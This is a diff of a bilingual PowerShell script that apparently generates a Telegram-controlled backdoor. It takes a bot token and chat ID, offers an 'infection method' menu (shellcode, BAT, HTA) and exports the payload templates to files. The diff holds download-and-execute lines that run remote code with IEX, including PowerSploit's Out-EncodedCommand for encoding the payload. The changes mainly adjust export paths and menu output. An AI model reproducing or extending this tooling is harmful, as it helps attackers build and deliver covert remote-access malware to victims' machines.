@@ -26,7 +26,7 @@ do
            '1' {
 		cls 
         $idioma = "Spanish"
-        IEX $show_banner		
+        IEX $show_banner ; sleep -Seconds 0.1		
         Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el Token del Bot de Telegram: " -ForegroundColor Green -NoNewline ; [string]$your_token = Read-Host
 		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca su Chat ID: " -ForegroundColor Green -NoNewline ; [int]$your_chat_id = Read-Host
 		Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Introduzca el delay para la conexion: " -ForegroundColor Green -NoNewline ; [int]$your_delay = Read-Host
@@ -55,8 +55,12 @@ Function check-command
  Finally {$ErrorActionPreference=$antigua_config}
  }
 
+################################### Comprobamos si existe el cmdlet Ivoke-WebRequest y en el caso de que no exista lo cargamos ######################################
+
 if ((check-command Invoke-WebRequest) -eq $false) {$objeto = "system.net.webclient" ; $webclient = New-Object $objeto ; $webrequest = $webclient.DownloadString("https://raw.githubusercontent.com/mwjcomputing/MWJ-Blog-Respository/master/PowerShell/Invoke-WebRequest.ps1");Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funciÃ³n Invoke-Webrequest`n" -ForegroundColor Green -NoNewline ; IEX $webrequest}
-Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline 
+$out_encoded_load_castellano = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
+$out_encoded_load_english = 'Write-Host "`n[" -ForegroundColor Green  -NoNewline ;Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Cargamos la funcion Out-EncodedCommand de PowerSploit `n" -ForegroundColor Green -NoNewline '
+if ($idioma -eq "English") {IEX $out_encoded_load_english} ; if ($idioma -eq "Spanish") {IEX $out_encoded_load_castellano}
 IEX (Invoke-WebRequest "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/ScriptModification/Out-EncodedCommand.ps1").content
 
 ############################################################### ScriptBlock del Backdoor ###############################################################
@@ -129,7 +133,10 @@ do
 
     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] ¿ Quieres exportar a un archivo ? (S/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
-     {    'S' { $salida = $pwd ; $Salida = $salida.Path + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; dir $salida}
+     {    'S' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Escriba la ruta para expotar el archivo : " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
+        $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; 
+        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] El archivo se exporto : " -ForegroundColor Green -NoNewline ; Write-Host (ls $salida).FullName "`n`n" -NoNewline
+        }
         } 'N' {return ;exit 	
 		
            }  
@@ -141,10 +148,11 @@ function Exportar-File { param ($plantilla,$tipo)
 do 
 { 
   
-
-    Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Do you want to export the code to a file? (Y/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
+      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Do you want to export the code to a file? (Y/N) " -ForegroundColor Green -NoNewline ; $input = Read-Host
          switch ($input) 
-     {    'Y' { $salida = $pwd ; $Salida = $salida.Path + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida; dir $salida}
+     {    'Y' { Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Enter the path to export the file: " -ForegroundColor Green -NoNewline ; $Salida = Read-Host
+        $salida = (ls $salida).DirectoryName[0] ; $Salida = $salida + "\OutFile" ; if ((Test-Path $Salida) -eq $false) {mkdir $Salida | Out-Null ; $salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} else {$salida = $salida + "\temp." + $tipo ; $plantilla | Out-File -Encoding ascii -FilePath $Salida} 
+        Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] The file is exported: " -ForegroundColor Green -NoNewline ; Write-Host (ls $salida).FullName "`n`n" -NoNewline
         } 'N' {return ;exit 	
 		
            }  
@@ -157,7 +165,7 @@ until ($input -eq "Y" -or $input -eq "N")}
 if ($idioma -eq "English"){
 do 
 { 
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Infection method" -ForegroundColor Green -NoNewline
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Infection method`n" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
@@ -167,7 +175,7 @@ do
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Select Option : " -ForegroundColor Green -NoNewline ; $input = Read-Host
      switch ($input) 
      { 
-           '1' {
+           '1' { IEX $your_code ; write-host $code
 		cls 
 		
            } '2' { IEX $your_code ; $plantilla_bat;Write-Host "`n`n" ; Exportar-File -plantilla $plantilla_bat -tipo "bat"
@@ -189,7 +197,7 @@ until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $inpu
 if ($idioma -eq "Spanish"){
 do 
 { 
-     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infección" -ForegroundColor Green -NoNewline
+     Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ; Write-Host "] Metodo de infección`n" -ForegroundColor Green -NoNewline
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "1" -ForegroundColor Red -NoNewline ; Write-Host "] ShellCode" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "2" -ForegroundColor Red -NoNewline ; Write-Host "] BAT" -ForegroundColor Green -NoNewline 
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "3" -ForegroundColor Red -NoNewline ; Write-Host "] HTA" -ForegroundColor Green -NoNewline 
@@ -199,7 +207,7 @@ do
      Write-Host "`n[" -ForegroundColor Green  -NoNewline ; Write-Host "+" -ForegroundColor Red -NoNewline ;Write-Host "] Seleccione opción : " -ForegroundColor Green -NoNewline ; $input = Read-Host
      switch ($input) 
      { 
-            '1' { IEX $tu_codigo ;
+            '1' { IEX $tu_codigo ; Write-Host $code
 
            } '2' { IEX $tu_codigo ; $plantilla_bat  ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_bat -tipo "bat"
            } '3' { IEX $tu_codigo ; $plantilla_hta ;Write-Host "`n`n" ; Exportar-Archivo -plantilla $plantilla_hta -tipo "hta"
@@ -214,6 +222,5 @@ do
 until ($input -eq 1 -or $input -eq 2 -or $input -eq 3 -or $input -eq 4 -or $input -eq 5 -or $input -eq 6) 
 }
 
-
-
+Pause
 
